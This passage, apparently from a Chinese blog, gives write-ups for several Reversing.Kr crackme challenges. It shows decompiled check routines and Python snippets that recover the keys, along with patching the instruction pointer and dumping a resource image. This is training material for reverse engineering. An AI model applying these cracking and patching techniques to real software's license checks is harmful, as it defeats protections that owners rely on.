    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; ((a &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; b) &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; (a &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; b))) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xff&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; cipher:
    print (chr(dec_byte(c, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;)), end&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#75715e&#34;&gt;# Do_u_like_ARM_instructi0n?:)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;multiplicative&#34;&gt;Multiplicative&lt;/h2&gt;
&lt;p&gt;反编译结果&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;JavaCrackMe&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;final&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;strictfp&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;String&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt; arg6&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
        Class v1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; JavaCrackMe&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
        __monitor_enter&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;v1&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
            System&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;out&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;println&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Reversing.Kr CrackMe!!&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
            System&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;out&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;println&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;-----------------------------&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
            System&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;out&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;println&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;The idea came out of the warsaw\&amp;#39;s crackme&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
            System&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;out&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;println&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;-----------------------------\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(((&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;Long&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;decode&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;arg6&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;0&lt;span style=&#34;color:#f92672&#34;&gt;]))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; 0x6869L &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;1536092243306511225L&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
                System&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;out&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;println&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Correct!&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
            &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
                System&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;out&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;println&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Wrong&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
            &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
        &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;catch&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Exception v0_1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
                System&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;out&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;println&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Please enter a 64bit signed int&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
            &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;catch&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Throwable v0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
                __monitor_exit&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;v1&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
                &lt;span style=&#34;color:#66d9ef&#34;&gt;throw&lt;/span&gt; v0&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
            &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
        &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;catch&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Throwable v0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
            __monitor_exit&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;v1&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;throw&lt;/span&gt; v0&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
        &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;

        __monitor_exit&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;v1&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;参数进行乘法后等于某个数字&lt;/p&gt;
&lt;p&gt;由于并不能整除，所以运算有溢出，一个方法是直接求逆元，另一种方法是爆破溢出位&lt;/p&gt;
&lt;p&gt;方法一：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;In [&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;]: &lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; libnum &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;

In [&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;]: tar &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1536092243306511225&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xffffffffffffffff&lt;/span&gt;

In [&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;]: hex(tar &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; invmod(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x6869&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10000000000000000&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10000000000000000&lt;/span&gt;)
Out[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;]: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;0x83676f67696c676f&amp;#39;&lt;/span&gt;

In [&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;]: (&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x83676f67696c676f&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xffffffffffffffff&lt;/span&gt;
Out[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;]: &lt;span style=&#34;color:#ae81ff&#34;&gt;8978084842198767761&lt;/span&gt;

In [&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;]: hex(&lt;span style=&#34;color:#ae81ff&#34;&gt;8978084842198767761&lt;/span&gt;)
Out[&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;]: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;0x7c98909896939891&amp;#39;&lt;/span&gt;

In [&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;]: hex(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;8978084842198767761&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xffffffffffffffff&lt;/span&gt;)
Out[&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;]: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;0x83676f67696c676f&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;方法二：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;In [&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;]: i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;

In [&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;]: &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;:
    &lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;:     &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;0xeaaeb43e477b8487&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; (i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6869&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
    &lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;:         &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;:     i &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;:

In [&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;]: i
Out[&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;]: &lt;span style=&#34;color:#ae81ff&#34;&gt;13719&lt;/span&gt;

In [&lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;]: hex((&lt;span style=&#34;color:#ae81ff&#34;&gt;0xeaaeb43e477b8487&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; (i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6869&lt;/span&gt;)
Out[&lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;]: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;0x83676f67696c676f&amp;#39;&lt;/span&gt;

In [&lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;]: &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;((&lt;span style=&#34;color:#ae81ff&#34;&gt;0xeaaeb43e477b8487&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; (i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6869&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xffffffffffffffff&lt;/span&gt;
Out[&lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;]: &lt;span style=&#34;color:#ae81ff&#34;&gt;8978084842198767761&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;运行结果&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;$ java -jar JavaCrackMe.jar -8978084842198767761
Reversing.Kr CrackMe!!
-----------------------------
The idea came out of the warsaw&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;s crackme
-----------------------------

Correct!
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;lotto&#34;&gt;LOTTO&lt;/h2&gt;
&lt;p&gt;输入需要通过的是一个随机数的逻辑&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 134; 
			flex-basis: 323px&#34;
	&gt;
	&lt;a href=&#34;/post/reversing-kr-writeups/lotto_pass.png&#34; data-size=&#34;835x620&#34;&gt;
		&lt;img src=&#34;/post/reversing-kr-writeups/lotto_pass.png&#34;
			width=&#34;835&#34;
			height=&#34;620&#34;
			srcset=&#34;/post/reversing-kr-writeups/lotto_pass_hu20c91c851f34c64c2ef609808df4fe9a_59936_480x0_resize_box_3.png 480w, /post/reversing-kr-writeups/lotto_pass_hu20c91c851f34c64c2ef609808df4fe9a_59936_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;直接修改 &lt;code&gt;ip&lt;/code&gt; 跳过即可&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;夜影还给出了一个有意思的方法：另写了一个程序，将相同 &lt;code&gt;srand(time64(0))&lt;/code&gt; 生成的随机数 &lt;code&gt;echo&lt;/code&gt; 传入这个程序&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;imageprc&#34;&gt;ImagePrc&lt;/h2&gt;
&lt;p&gt;MFC 逆向&lt;/p&gt;
&lt;p&gt;根据字符串 &lt;code&gt;Wrong&lt;/code&gt; 可以定位到关键函数&lt;/p&gt;
&lt;p&gt;注意到&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;      GetObjectA(hbm, &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;, pv);
      memset(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;bmi, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x28u&lt;/span&gt;);
      bmi.bmiHeader.biHeight &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; cLines;
      bmi.bmiHeader.biWidth &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v16;
      bmi.bmiHeader.biSize &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;;
      bmi.bmiHeader.biPlanes &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
      bmi.bmiHeader.biBitCount &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;;
      bmi.bmiHeader.biCompression &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
      GetDIBits(hdc, (HBITMAP)hbm, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, cLines, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;bmi, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
      v8 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;operator&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt;(bmi.bmiHeader.biSizeImage);
      GetDIBits(hdc, (HBITMAP)hbm, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, cLines, v8, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;bmi, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
      v9 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; FindResourceA(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, (LPCSTR)&lt;span style=&#34;color:#ae81ff&#34;&gt;0x65&lt;/span&gt;, (LPCSTR)&lt;span style=&#34;color:#ae81ff&#34;&gt;0x18&lt;/span&gt;);
      v10 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; LoadResource(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, v9);
      v11 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; LockResource(v10);
      v12 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
      v13 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v8;
      v14 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v11 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; (_BYTE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)v8;
      &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ( &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;v13 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; v13[v14] )
      {
        &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;v12;
        &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;v13;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( v12 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;90000&lt;/span&gt; )
        {
          sub_401500(v8);
          &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
        }
      }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;从资源中加载 90000 字节并比较&lt;/p&gt;
&lt;p&gt;动调或者 &lt;code&gt;Resource Hacker&lt;/code&gt; dump 下来&lt;/p&gt;
&lt;p&gt;判断要求绘制的位图需要相同&lt;/p&gt;
&lt;p&gt;PIL 转成图片&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; PIL &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; Image

fp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;export_results.txt&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;rb&amp;#39;&lt;/span&gt;)
pic &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; fp&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read()

im &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Image&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;new(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;RGB&amp;#34;&lt;/span&gt;, (&lt;span style=&#34;color:#ae81ff&#34;&gt;0xc8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x96&lt;/span&gt;))

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, len(pic), &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;):
    im&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;putpixel(((i &lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xc8&lt;/span&gt;, (i &lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xc8&lt;/span&gt;), (pic[i], pic[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;], pic[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;]))

im &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; im&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;transpose(Image&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;FLIP_TOP_BOTTOM)
im&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;show()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;flash-encrypt&#34;&gt;Flash Encrypt&lt;/h2&gt;
&lt;p&gt;使用 &lt;code&gt;ffdec&lt;/code&gt; 反编译&lt;/p&gt;
&lt;p&gt;可以看到每个帧的 AS 脚本，使用自动去混淆即可&lt;/p&gt;
